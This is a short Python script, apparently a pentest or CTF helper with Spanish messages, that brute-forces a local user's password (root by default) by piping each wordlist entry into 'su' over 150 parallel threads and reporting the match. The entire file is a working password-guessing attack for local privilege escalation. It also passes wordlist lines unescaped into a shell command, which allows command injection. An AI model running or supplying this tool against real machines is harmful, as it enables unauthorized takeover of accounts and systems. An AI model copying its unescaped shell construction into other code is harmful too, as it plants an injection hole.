import subprocess
import argparse
import concurrent.futures

parser = argparse.ArgumentParser("python su-brute.py")
parser.add_argument("-u", "--username", help="Username to perform the attack", type=str, default="root")
parser.add_argument("-w", "--wordlists", help="Wordlists to perform the brute force attack", type=str)
args = parser.parse_args()

def brute(line,username):
		result = subprocess.run(["echo {} | su {}".format(line,username)], shell=True, capture_output=True, text=True)
		print('[-]Espere comprobando claves...{}'.format(line)+" "*10,end='\r',flush=True)
		if(result.returncode==0):
			return line
		else:
			return None

if __name__ == '__main__':
	if not args.wordlists:
		print("\n[*] Se tiene que definir una wordlists. Vea la ayuda: python su-brute.py --help\n")
		exit(1)
	dic_pass = args.wordlists
	username = args.username
	pass_found = None
	with open(dic_pass,'r')as password:
		with concurrent.futures.ThreadPoolExecutor(max_workers=150) as executor:
			futures = []
			for line in password:
				line =line.strip()
				future= executor.submit(brute,line,username)
				futures.append(future)
			for future in concurrent.futures.as_completed(futures):
				resultado=future.result()
				if resultado is not None:
					pass_found = resultado
					break
	if pass_found:
		print("\n[+] PASSWORD ENCONTRADA: {}\n".format(pass_found))
	else:
		print("\n[-] La contraseña no fue encontrada.\n")
